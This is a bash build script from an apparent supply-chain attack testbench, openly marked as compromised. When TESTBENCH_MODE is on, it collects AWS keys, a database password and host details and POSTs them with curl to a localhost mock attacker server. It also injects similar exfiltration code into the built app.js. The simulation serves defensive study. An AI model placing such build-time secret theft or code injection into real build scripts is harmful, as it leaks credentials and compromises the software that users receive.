#!/bin/bash

# COMPROMISED BUILD SCRIPT
# This build script has been modified by an attacker
# It includes malicious code injection

set -e  # Exit on error
BUILD_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=========================================="
echo "🔨 Starting Build Process"
echo "=========================================="
echo ""

# ============================================================================
# MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
# ============================================================================

# SAFETY CHECK: Only run in testbench environment
if [ "$TESTBENCH_MODE" = "enabled" ]; then
  echo "[TESTBENCH] Simulating build-time data exfiltration..."
  
  # Collect build-time secrets and environment variables
  DATA=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "buildType": "compromised",
  "environment": {
    "AWS_ACCESS_KEY_ID": "${AWS_ACCESS_KEY_ID:-not-set}",
    "AWS_SECRET_ACCESS_KEY": "${AWS_SECRET_ACCESS_KEY:-not-set}",
    "DATABASE_PASSWORD": "${DATABASE_PASSWORD:-not-set}",
    "NODE_ENV": "${NODE_ENV:-not-set}",
    "CI": "${CI:-not-set}"
  },
  "system": {
    "user": "$(whoami)",
    "hostname": "$(hostname)",
    "pwd": "$(pwd)"
  }
}
EOF
)
  
  # SAFETY: Only send to localhost (mock attacker server)
  echo "$DATA" | curl -s -X POST http://localhost:3000/collect \
    -H "Content-Type: application/json" \
    -d @- > /dev/null 2>&1 || true

  # Optional: mirror exfil to Floci S3 (SCAS_FLOCI_ENABLED=1 + Floci on :4566)
  if [ "$SCAS_FLOCI_ENABLED" = "1" ]; then
    echo "$DATA" | "${BUILD_DIR}/../infrastructure/floci/exfil.sh" secrets || true
  fi
  
  echo "[TESTBENCH] Build-time data exfiltration simulated"
fi

# ============================================================================
# LEGITIMATE BUILD CODE
# ============================================================================

# Create build directory
echo "📁 Creating build directory..."
mkdir -p dist
echo "✅ Build directory created"
echo ""

# Compile source files (with malicious code injection)
echo "📦 Compiling source files..."
cat > dist/app.js << 'EOF'
/**
 * COMPROMISED APPLICATION
 * This code was injected during the build process
 */

// ============================================================================
// MALICIOUS CODE INJECTED DURING BUILD
// ============================================================================
if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  
  const data = {
    timestamp: new Date().toISOString(),
    source: 'compromised-build',
    environment: {
      NODE_ENV: process.env.NODE_ENV,
      PWD: process.env.PWD
    }
  };
  
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };
  
  const req = http.request(options, () => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
}
// ============================================================================

console.log('Application starting...');
console.log('Version: 1.0.0');
console.log('Build completed successfully');

// Application code
function main() {
  console.log('Application running...');
}

main();
EOF

echo "✅ Source files compiled"
echo ""

# Run tests
echo "🧪 Running tests..."
npm test
echo "✅ Tests passed"
echo ""

# Create build manifest
echo "📝 Creating build manifest..."
cat > dist/manifest.json << EOF
{
  "version": "1.0.0",
  "buildDate": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "buildSystem": "compromised",
  "checksum": "$(sha256sum dist/app.js | cut -d' ' -f1)"
}
EOF

echo "✅ Build manifest created"
echo ""

echo "=========================================="
echo "✅ Build Complete!"
echo "=========================================="
echo ""
echo "Build artifacts:"
echo "  - dist/app.js"
echo "  - dist/manifest.json"
echo ""

if [ "$TESTBENCH_MODE" = "enabled" ] && [ "$SCAS_FLOCI_ENABLED" = "1" ]; then
  "${BUILD_DIR}/../infrastructure/floci/exfil.sh" artifacts "${BUILD_DIR}/dist" || true
fi


